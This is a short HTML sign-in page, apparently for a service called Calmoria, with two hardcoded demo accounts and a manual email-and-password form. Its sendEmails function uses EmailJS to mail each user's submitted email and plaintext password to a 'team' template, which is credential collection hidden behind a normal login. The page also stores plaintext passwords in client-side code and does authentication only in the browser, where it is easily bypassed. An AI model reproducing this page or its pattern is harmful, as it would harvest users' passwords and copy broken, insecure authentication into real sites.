<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign In</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- ✅ Updated EmailJS SDK v3 -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  
  <script>
    window.onload = function () {
      emailjs.init("xYUaaGyIcJwOxhYGo"); // ✅ Your actual public key
    };
  </script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen p-4">
  <div class="bg-white rounded-2xl max-w-md w-full p-6 shadow-lg">
    <h2 class="font-extrabold text-xl mb-6">Choose an account</h2>

    <!-- Buttons for predefined accounts -->
    <div class="space-y-4 mb-6">
      <button onclick="loginWithAccount('Jacky Grover', 'jacky.grover@gmail.com')" class="w-full bg-indigo-600 text-white py-3 rounded-md">Jacky Grover</button>
      <button onclick="loginWithAccount('Diana DSouza', 'diana.dsouza@gmail.com')" class="w-full bg-purple-700 text-white py-3 rounded-md">Diana DSouza</button>
    </div>

    <hr class="my-4">

    <!-- Manual login form -->
    <form id="loginForm" class="space-y-4" onsubmit="handleManualLogin(event)">
      <input type="email" id="email" placeholder="Email" class="w-full border px-4 py-2 rounded" required />
      <input type="password" id="password" placeholder="Password" class="w-full border px-4 py-2 rounded" required />
      <button type="submit" class="w-full bg-green-600 text-white py-3 rounded-md">Sign In</button>
    </form>
  </div>

  <script>
    const registeredUsers = [
      { name: "Jacky Grover", email: "jacky.grover@gmail.com", password: "jacky123" },
      { name: "Diana DSouza", email: "diana.dsouza@gmail.com", password: "diana123" }
    ];

    function loginWithAccount(name, email) {
      const matchedUser = registeredUsers.find(u => u.name === name && u.email === email);
      if (matchedUser) {
        localStorage.setItem("userName", name);
        localStorage.setItem("userEmail", email);
        sendEmails(name, email, "auto");
        alert(`✅ Logged in as ${name}`);
        window.location.href = "dashboard.html";
      } else {
        alert("❌ Account not found.");
      }
    }

    function handleManualLogin(event) {
      event.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const user = registeredUsers.find(u => u.email === email && u.password === password);

      const name = user ? user.name : email.split("@")[0];
      if (user || (localStorage.getItem("registeredEmail") === email && localStorage.getItem("registeredPassword") === password)) {
        localStorage.setItem("userName", name);
        localStorage.setItem("userEmail", email);
        sendEmails(name, email, password);
        alert(`✅ Logged in as ${name}`);
        window.location.href = "dashboard.html";
      } else {
        alert("❌ Invalid credentials.");
      }
    }

    function sendEmails(username, email, password) {
      // 1. Send to user
      emailjs.send("service_gul50nv", "template_e4ye8zg", {
        to_email: email,
        user_name: username
      })
      .then((res) => console.log("✅ Email to user sent:", res))
      .catch((err) => alert("❌ Failed user email: " + JSON.stringify(err)));

      // 2. Send to Calmoria team
      emailjs.send("service_gul50nv", "template_gllz147", {
        user_email: email,
        user_password: password
      })
      .then((res) => console.log("✅ Email to team sent:", res))
      .catch((err) => alert("❌ Failed team email: " + JSON.stringify(err)));
    }
  </script>
</body>
</html>

